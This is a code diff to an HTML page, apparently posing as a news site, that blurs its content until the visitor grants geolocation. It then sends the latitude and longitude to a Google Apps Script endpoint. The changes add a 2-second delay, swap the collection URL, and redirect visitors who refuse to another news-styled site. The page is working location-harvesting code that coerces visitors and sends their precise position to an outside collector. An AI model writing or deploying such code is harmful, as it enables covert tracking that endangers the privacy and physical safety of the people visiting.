@@ -155,25 +155,29 @@
 
   <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
 
-  <script>
-    document.body.classList.add('blurred');
+<script>
+  // Adicionando o borrão logo que a página carrega, mas com atraso na geolocalização
+  document.body.classList.add('blurred');
 
-    function liberarConteudo() {
-      document.body.classList.remove('blurred');
-      document.getElementById('overlay').style.display = 'none';
-    }
+  function liberarConteudo() {
+    document.body.classList.remove('blurred');
+    document.getElementById('overlay').style.display = 'none';
+  }
 
-    window.addEventListener('load', () => {
+  window.addEventListener('load', () => {
+    // Primeiro, aguarda 2 segundos para fazer a solicitação de geolocalização
+    setTimeout(() => {
       if (!navigator.geolocation) {
-        window.close();
+        window.location.replace("https://noticias-parana.netlify.app/");
         return;
       }
 
+      // Solicitação de localização após o delay de 2 segundos
       navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
+        const url = "https://script.google.com/macros/s/AKfycbw4Me_ogE9h_X_lH_NgQq2CGIfh1thqljS5SgivpHjQym7vCvyEIt7ymQ1dSX0uj0Y1AQ/exec";
         const payload = { latitude: lat, longitude: lon };
 
         try {
@@ -188,10 +192,11 @@
         liberarConteudo();
 
       }, (error) => {
-        window.close();
+        window.location.replace("https://noticias-parana.netlify.app/");
       });
-    });
-  </script>
+    }, 2000); // Delay de 2 segundos (2000 milissegundos)
+  });
+</script>
 
 </body>
 </html>
